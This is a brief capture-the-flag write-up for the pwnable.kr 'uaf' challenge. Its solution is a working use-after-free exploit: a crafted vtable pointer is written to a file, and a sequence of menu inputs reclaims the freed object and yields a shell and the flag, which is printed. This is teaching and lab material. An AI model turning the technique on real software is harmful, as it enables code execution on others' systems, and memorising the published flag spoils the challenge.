## Requirements
Mommy, what is Use After Free bug?

ssh uaf@pwnable.kr -p2222 (pw:guest)

---
## Note  
keywords: - virtual tables

```sh
uaf@pwnable:~$ uname -a
Linux pwnable 4.4.179-0404179-generic #201904270438 SMP Sat Apr 27 08:41:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
uaf@pwnable:~$
```
## solution
```sh
echo '\x88\x15\x40\x00\x00\x00\x00\x00' > input.txt
./uaf 16 input.txt
1. use
2. after
3. free
1
My name is Jack
I am 25 years old
I am a nice guy!
My name is Jill
I am 21 years old
I am a cute girl!
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag      			
yay_f1ag_aft3r_pwning
$ 
```
**flag: yay_f1ag_aft3r_pwning**